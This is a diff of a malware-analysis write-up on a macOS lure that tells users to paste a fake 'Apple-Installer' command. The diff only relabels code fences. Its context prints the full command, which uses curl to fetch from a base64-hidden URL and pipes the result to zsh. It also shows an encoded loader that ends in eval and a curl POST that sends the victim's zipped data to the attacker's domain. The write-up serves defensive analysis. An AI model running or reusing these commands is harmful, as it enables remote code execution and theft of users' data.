@@ -12,7 +12,7 @@ Domain: hxxps[://]macfilearchive[.]com/s3/
 
 This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it is referencing Apple's legitimate domain, but the full command is as follows:
 
-```zsh
+```bash
 echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ='|base64 -D)|zsh
 ```
 
@@ -24,7 +24,7 @@ hxxp[://]ballfrank[.]today/curl/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba934
 
 I'll instead download the contents of this file without executing it, which results in:
 
-```zsh
+```bash
 #!/bin/zsh
 d23727=$(base64 -D <<'PAYLOAD_m317823069430411' | gunzip
 H4sIAK23RWkAA+VUXW/TMBR976+4eNW0SSSx89l2lG1CgqFRDWlDTAJUOfZ1a9VxosSFbsB/J3RV
@@ -44,7 +44,7 @@ eval "$d23727"
 
 The Base64 body can be transformed from base64 and gunzipped to reveal:
 
-```zsh
+```bash
 #!/bin/zsh
 daemon_function() {
     exec </dev/null
@@ -735,7 +735,7 @@ A fake compatibility error prompt is then shown to the victim:
 
 The zip archive containing all of the users sensitive information is then exfiltrated via a POST request to ballfrank[.]today, as was shown in the previous script:
 
-```zsh
+```bash
 curl -k -X POST \
      -H "User-Agent: Mozilla/5.0 ..." \
      -H "api-key: $api_key" \
